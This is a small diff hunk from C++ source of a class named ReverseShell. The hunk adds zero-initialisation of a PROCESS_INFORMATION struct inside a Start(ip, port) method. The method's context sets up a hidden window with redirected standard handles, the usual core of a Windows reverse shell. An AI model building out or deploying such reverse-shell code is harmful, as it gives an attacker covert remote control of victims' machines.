@@ -32,6 +32,7 @@ void ReverseShell::Start(const std::string& ip, int port) {
             STARTUPINFOA si;
             PROCESS_INFORMATION pi;
             memset(&si, 0, sizeof(si));
+            memset(&pi, 0, sizeof(pi)); // A++ Initialization
             si.cb = sizeof(si);
             si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
             si.wShowWindow = SW_HIDE;
